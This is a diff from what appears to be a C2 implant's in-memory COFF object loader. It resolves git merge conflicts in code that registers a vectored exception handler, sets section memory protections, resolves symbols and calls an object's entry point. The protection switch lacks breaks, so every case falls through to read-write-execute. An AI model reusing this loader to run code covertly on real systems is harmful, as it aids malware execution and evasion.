@@ -1,11 +1,8 @@
 #include <core/include/objects.hpp>
 namespace Objects {
-<<<<<<< HEAD
-    LPVOID ExceptionReturn = { };
-=======
+
     LONG WINAPI Debugger(const EXCEPTION_POINTERS* exception) {
         HEXANE
->>>>>>> fa655a35da8994c5374e91fb02aad479e47a6ec9
 
         exception->ContextRecord->IP_REG = U_PTR(ExceptionReturn);
         ntstatus = exception->ExceptionRecord->ExceptionCode;
@@ -217,7 +214,6 @@ namespace Objects {
         return true;
     }
 
-<<<<<<< HEAD
     BOOL ExecuteObject(_executable *object, const char *entrypoint, char *args, uint32_t size, uint32_t req_id) {
         HEXANE
 
@@ -225,15 +221,6 @@ namespace Objects {
         char *symbol_name   = { };
         void *veh_handler   = { };
         void *exec          = { };
-=======
-    BOOL ExecuteObject(_executable* object, const char* entrypoint, char* args, uint32_t size, uint32_t req_id) {
-        HEXANE
-
-        bool    success     = false;
-        char*   symbol_name = { };
-        void*   veh_handler = { };
-        void*   exec        = { };
->>>>>>> fa655a35da8994c5374e91fb02aad479e47a6ec9
 
         x_assert(veh_handler = Ctx->nt.RtlAddVectoredExceptionHandler(1, &Memory::Execute::Debugger));
 
@@ -244,7 +231,6 @@ namespace Objects {
                 uint32_t protection = 0;
 
                 switch (object->section->Characteristics & IMAGE_SCN_MEM_RWX) {
-<<<<<<< HEAD
                     case NULL:                  protection = PAGE_NOACCESS;
                     case IMAGE_SCN_MEM_READ:    protection = PAGE_READONLY;
                     case IMAGE_SCN_MEM_RX:      protection = PAGE_EXECUTE_READ;
@@ -252,15 +238,6 @@ namespace Objects {
                     case IMAGE_SCN_MEM_WRITE:   protection = PAGE_WRITECOPY;
                     case IMAGE_SCN_MEM_XCOPY:   protection = PAGE_EXECUTE_WRITECOPY;
                     default:                    protection = PAGE_EXECUTE_READWRITE;
-=======
-                case NULL: protection = PAGE_NOACCESS;
-                case IMAGE_SCN_MEM_READ:    protection = PAGE_READONLY;
-                case IMAGE_SCN_MEM_RX:      protection = PAGE_EXECUTE_READ;
-                case IMAGE_SCN_MEM_RW:      protection = PAGE_READWRITE;
-                case IMAGE_SCN_MEM_WRITE:   protection = PAGE_WRITECOPY;
-                case IMAGE_SCN_MEM_XCOPY:   protection = PAGE_EXECUTE_WRITECOPY;
-                default:                    protection = PAGE_EXECUTE_READWRITE;
->>>>>>> fa655a35da8994c5374e91fb02aad479e47a6ec9
                 }
 
                 if ((object->section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) == IMAGE_SCN_MEM_NOT_CACHED) {
@@ -278,20 +255,11 @@ namespace Objects {
         for (auto sym_index = 0; sym_index < object->nt_head->FileHeader.NumberOfSymbols; sym_index++) {
             if (object->symbol[sym_index].First.Value[0]) {
                 symbol_name = object->symbol[sym_index].First.Name;
-<<<<<<< HEAD
             } else {
                 symbol_name = R_CAST(char*, object->symbol + object->nt_head->FileHeader.NumberOfSymbols + object->symbol[sym_index].First.Value[1]);
             }
 #if _M_IX86
             if (symbol_name[0] == 0x5F) {
-=======
-            }
-            else {
-                symbol_name = R_CAST(char*, object->symbol + object->nt_head->FileHeader.NumberOfSymbols + object->symbol[sym_index].First.Value[1]);
-            }
-#if _M_IX86
-                if (symbol_name[0] == 0x5F) {
->>>>>>> fa655a35da8994c5374e91fb02aad479e47a6ec9
                     symbol_name++;
                 }
 #endif
@@ -303,13 +271,8 @@ namespace Objects {
 
         for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
             if (U_PTR(exec) >= SEC_START(object->sec_map, sec_index) && U_PTR(exec) < SEC_END(object->sec_map, sec_index)) {
-<<<<<<< HEAD
 
                 object->section = SECTION_HEADER(object->buffer, sec_index);
-=======
-                object->section = SECTION_HEADER(object->buffer, sec_index);
-
->>>>>>> fa655a35da8994c5374e91fb02aad479e47a6ec9
                 if ((object->section->Characteristics & IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE) {
                     success = true;
                 }
@@ -321,7 +284,6 @@ namespace Objects {
         if (success) {
             const auto entry    = R_CAST(obj_entry, exec);
             ExceptionReturn     = __builtin_extract_return_addr(__builtin_return_address(0));
-<<<<<<< HEAD
             entry(args, size);
         }
 
@@ -329,17 +291,7 @@ namespace Objects {
         if (veh_handler) { Ctx->nt.RtlRemoveVectoredExceptionHandler(veh_handler); }
         return success;
     }
-=======
 
-            entry(args, size);
-        }
-
-    defer:
-        if (veh_handler) { Ctx->nt.RtlRemoveVectoredExceptionHandler(veh_handler); }
-        return success;
-    }
-
->>>>>>> fa655a35da8994c5374e91fb02aad479e47a6ec9
     VOID LoadObject(_parser parser) {
         HEXANE
 
